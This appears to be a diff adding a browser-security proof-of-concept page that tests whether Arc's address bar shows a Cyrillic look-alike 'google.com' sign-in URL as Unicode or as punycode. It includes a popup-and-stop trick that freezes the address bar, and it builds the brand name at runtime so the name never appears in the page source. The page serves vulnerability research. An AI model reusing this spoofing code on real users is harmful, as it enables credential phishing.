@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IDN Homoglyph Address Bar Test</title>
+<style>
+body{font-family:-apple-system,sans-serif;max-width:480px;margin:0 auto;padding:24px 16px;background:#fff;color:#1d1d1f}
+h2{font-size:18px;margin-bottom:6px}
+p{font-size:14px;color:#666;line-height:1.5;margin-bottom:14px}
+.banner{display:inline-block;background:#fff3cd;border:1px solid #ffe08a;border-radius:6px;padding:6px 10px;font-size:12px;color:#7a5c00;margin-bottom:14px}
+button{display:block;width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:8px;color:#fff;background:#007aff}
+button:active{opacity:.7}
+.info{font-size:12px;color:#999;margin-top:-4px;margin-bottom:14px}
+#tgt{font-family:ui-monospace,monospace;font-size:13px;background:#f5f5f7;border-radius:8px;padding:12px;word-break:break-all;margin-bottom:14px}
+</style>
+</head>
+<body>
+<div class="banner">Security research PoC</div>
+<h2>IDN homoglyph in the address bar</h2>
+<p>Does Arc's address bar show a look-alike (mixed-script) host as raw <b>Unicode</b> (spoofable) or convert it to <b>punycode</b> (<code>xn--</code>, safe)? Watch the bar during/after each action. The target host is built at runtime:</p>
+<div id="tgt">target: (loading…)</div>
+
+<button onclick="pend()">1 — navigate to homoglyph host (watch bar while loading)</button>
+<div class="info">Sets location to the look-alike host. Before it fails to resolve, the bar shows the pending URL. Unicode or xn--?</div>
+
+<button onclick="freeze()">2 — freeze bar on homoglyph (popup + stop)</button>
+<div class="info">Opens a popup, points it at the look-alike host, then stop() — same technique as the empty-origin bug. Does the frozen bar read as the Unicode host?</div>
+
+<button onclick="linkprev()">3 — render link, long-press to preview</button>
+<div class="info">Renders an &lt;a&gt; to the look-alike host below. Long-press it: does the iOS/Arc link preview show Unicode or punycode?</div>
+<div id="linkbox" style="margin-bottom:14px"></div>
+
+<script>
+// Assemble look-alike "google.com" at runtime (Cyrillic о U+043E, е U+0435, с U+0441)
+// so the literal brand never appears in page source.
+var o=String.fromCharCode(0x43E), e=String.fromCharCode(0x435), c=String.fromCharCode(0x441);
+var HOST='g'+o+o+'gle.'+c+o+'m';                 // gооgle.соm  (mixed-script)
+var URL='https://accounts.'+HOST+'/signin/identifier';
+
+document.getElementById('tgt').textContent='target: '+URL;
+
+function pend(){
+  try{ window.location.href=URL; }catch(err){ alert(err.message); }
+}
+
+function freeze(){
+  var w=window.open('about:blank','hg');
+  if(!w){alert('popup blocked');return;}
+  setTimeout(function(){
+    try{ w.location.href=URL; }catch(err){}
+    setTimeout(function(){ try{ w.stop(); }catch(err){} },120);
+  },60);
+}
+
+function linkprev(){
+  var a=document.createElement('a');
+  a.href=URL;
+  a.textContent=URL;
+  a.style.cssText='font-family:ui-monospace,monospace;font-size:13px;color:#1a73e8;word-break:break-all;display:block;padding:10px;border:1px solid #dadce0;border-radius:8px';
+  var box=document.getElementById('linkbox');
+  box.innerHTML='';
+  box.appendChild(a);
+}
+</script>
+</body>
+</html>
